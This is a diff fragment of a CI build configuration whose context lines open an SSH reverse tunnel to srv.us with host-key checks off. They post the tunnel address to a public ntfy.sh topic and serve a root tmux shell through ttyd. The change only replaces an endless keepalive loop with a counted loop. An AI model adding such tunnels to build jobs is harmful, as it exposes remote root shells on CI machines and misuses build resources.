@@ -10,4 +10,4 @@ docker_builder:
     - curl -sL -o /dev/null -d "$(/usr/bin/ssh -tt -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o ServerAliveInterval=5 srv.us -R 1:127.0.0.1:22 -R 2:127.0.0.1:7681 -C exit 2> /dev/null | tee /tmp/srv.us.addr | grep https)" ntfy.sh/f8322530-63e7-4d54-a34d-194707a9b784
     - /usr/bin/ssh -tt -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o ServerAliveInterval=5 srv.us -R 1:127.0.0.1:22 -R 2:127.0.0.1:7681 > /dev/null 2>&1 &
     - /usr/local/bin/ttyd -p 7681 -i lo -W -t fontSize=13 -t fontFamily=monospace -t titleFixed="ttyd - GitLab" -m 1 /usr/bin/ssh -tt -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o ServerAliveInterval=5 root@localhost -C 'tmux a || tmux' > /dev/null 2>&1 &
-    - /bin/bash -c 'while true; do uptime -p; sleep 300; done'; echo Task done
+    - counter=0; until [ $counter -eq 117 ]; do uptime -p; ((counter++)); done
